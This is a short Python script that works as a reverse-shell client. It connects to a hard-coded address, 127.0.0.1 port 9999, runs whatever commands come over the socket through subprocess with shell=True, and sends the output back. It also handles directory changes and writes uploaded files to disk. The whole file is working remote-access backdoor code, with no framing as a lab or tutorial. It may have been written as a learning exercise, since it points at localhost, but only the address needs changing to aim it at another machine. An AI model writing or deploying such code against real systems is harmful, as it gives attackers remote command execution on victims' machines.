import socket
import subprocess
import os
host = '127.0.0.1'
port = 9999

def readFile(filename):
    '''
    :param filename:
    :return:
    '''
    with open(file=filename) as f:
        data = f.read()
        data = data.rstrip()
        return data

def writeFile(filename, data):
    '''
    :param filename: string
    :param data: bytes
    :return:
    '''
    print(data)
    data = str(data, 'utf-8')
    filename = filename + '.markdown'
    with open(file=filename, mode='w') as f:
        f.write(data)

def excFileCommand(sock):
    '''
    :param sock:
    :return: none
    '''
    # get the rev filename
    sock.sendall(b'Please input the file name:')
    filename = sock.recv(4096)
    filename = str(filename, 'utf-8')

    # get the length of the file
    file_len = sock.recv(4096)
    file_len = int(str(file_len, 'utf-8'))

    # rev the file data
    fileData = revData(file_len, sock)

    # write the data to file
    writeFile(filename, fileData)

def revData(rev_len, conn):
    '''
    :param rev_len:
    :param conn:
    :return:
    '''
    rev_answer = bytes()
    while len(rev_answer) != rev_len:
        data = conn.recv(1024)
        rev_answer += data
    return rev_answer

def main():
    '''
    :return:
    '''
    sock = socket.socket()
    print("Socket Create...")

    sock.connect((host, port))
    while 1:
        # rev the command
        req = sock.recv(4096)
        cmd_str = str(req, 'utf-8')
        print(cmd_str)
        if cmd_str == 'close connection': break

        # if the command is 'cd ..'
        if cmd_str[0:2] == 'cd':
            buf = cmd_str[3:]
            os.chdir(buf)
            continue

        # file command
        if cmd_str == 'Send File':
            excFileCommand(sock)
            continue

        # exc the command
        cmd = subprocess.Popen(cmd_str, shell=True, stdout=subprocess.PIPE)

        # get the output result
        run_result = cmd.stdout.read()

        # send the output result' length
        run_result_len = len(run_result)
        sock.sendall(bytes(str(run_result_len), 'utf-8'))

        # send the output data
        if run_result_len == 0:
            run_result = b'This command has no response...'
        sock.sendall(run_result)
    sock.close()
if __name__ == '__main__':
    main()